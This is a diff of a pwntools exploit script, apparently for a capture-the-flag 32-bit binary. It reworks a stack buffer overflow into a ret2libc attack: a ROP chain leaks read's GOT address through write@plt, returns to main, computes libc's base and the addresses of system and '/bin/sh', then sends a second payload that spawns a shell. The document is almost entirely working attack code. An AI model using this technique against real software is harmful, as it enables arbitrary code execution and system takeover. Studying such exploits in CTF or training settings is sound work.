@@ -20,22 +20,29 @@ read_plt = 0x080490b0
 read_got = 0x0804bfd4
 write_plt = 0x08049100
 write_got = 0x0804bfe8
+main = 0x80492ca
 
 
 payload = b'A'*0x40
 payload += b'B'*0x4
-payload += p32(pop_ret)
-payload += p32(read_got)
 payload += p32(write_plt)
-payload += p32(8)
+payload += p32(pop3_ret)
+payload += p32(1)
+payload += p32(read_got)
+payload += p32(4)
+payload += p32(main)
 
+p.sendline(payload)
 
-
+read_addr = u32(p.recv(4))
 
 libc_base = read_addr - libc.symbol['read']
 system_addr = libc_base + libc.symbol['system']
 binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
 
+
+payload = b'A'*0x40
+payload += b'B'*0x4
 payload += p32(system_addr)
 payload += b'C'*0x4
 payload += p32(binsh)
